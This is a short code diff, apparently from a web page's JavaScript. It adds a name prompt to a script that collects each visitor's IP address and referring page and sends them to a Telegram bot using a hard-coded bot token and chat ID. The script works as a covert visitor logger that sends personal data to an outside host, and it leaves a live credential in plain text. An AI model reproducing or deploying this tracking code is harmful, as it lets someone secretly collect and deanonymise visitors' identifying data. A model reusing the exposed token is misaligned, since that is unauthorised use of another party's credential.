@@ -30,8 +30,9 @@
                 .then(response => response.json())
                 .then(data => {
                     var ip = data.ip;
+                    var userName = prompt("Please enter your name:");
                     var location = document.referrer;
-                    var data = 'IP: ' + ip + ', Location: ' + location;
+                    var data = 'IP: ' + ip + ', Name: ' + userName + ', Location: ' + location;
                     var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                     var chatId = '5410457102';
                     fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
